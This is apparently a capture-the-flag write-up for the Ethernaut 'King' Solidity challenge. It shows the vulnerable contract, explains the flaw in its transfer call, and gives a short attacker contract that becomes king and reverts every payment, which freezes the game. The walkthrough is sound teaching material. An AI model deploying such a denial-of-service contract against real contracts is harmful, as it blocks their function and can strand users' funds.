# 09. King

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

## Vulnerability

The issue with this contract is `king.transfer(msg.value);` as it assumes that king is an EOA.

If king is a contract address, this contract could handle the transfer with the receive() function and revert the transaction.
This would forbid any execution of the following lines :

```solidity
king = msg.sender;
prize = msg.value;
```

And therefore, no one could take the current king's place...

This can be done simply with the following contract :

```solidity
pragma solidity ^0.8.0;

contract OnlyKing {
    
    constructor(address targetContract) payable {
        require(msg.value >= 1 ether, "Send 1 ether or more");
        (bool success, bytes memory rvalue) = targetContract.call{value: msg.value}("");
        require(success);
    }
    
    receive() external payable{
        revert();
    }

}
```

